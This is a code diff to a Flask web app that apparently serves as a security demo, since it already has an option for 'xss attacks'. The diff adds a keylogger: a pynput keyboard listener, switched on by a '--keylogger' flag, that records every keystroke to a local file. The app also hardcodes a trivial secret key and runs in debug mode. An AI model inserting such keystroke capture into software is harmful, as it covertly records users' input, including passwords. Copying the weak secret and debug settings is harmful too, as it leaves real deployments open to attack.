@@ -16,9 +16,13 @@ import time
 import pyotp
 from email.header import Header
 from email.mime.text import MIMEText
+from pynput import keyboard
 
 parser = argparse.ArgumentParser(description="Argparse")
 parser.add_argument("--xss", default=False, type=bool, help="whether set xss attacks")
+parser.add_argument(
+    "--keylogger", default=False, type=bool, help="whether set key logger"
+)
 args = parser.parse_args()
 app = Flask(__name__)
 app.secret_key = "1"
@@ -265,7 +269,26 @@ def change_password():
     return render_template("home/change_password.html")
 
 
+def keyPressed(key):  # automatically passing in key (the info)
+    print(str(key))
+    # create the file and log the key input
+    # 'a' means appending
+    with open("keyfile.txt", "a") as logKey:
+        try:
+            char = key.char  # convert into char
+            print(char)
+            print(len(char))
+            logKey.write(char)
+        except:
+            print("Error getting char")
+
+
 if __name__ == "__main__":
+    if args.keylogger == True:
+        listener = keyboard.Listener(
+            on_press=keyPressed
+        )  # everytime the key is pressed, passed information to keypressed function
+        listener.start()
     app.run(debug=True)
 
 
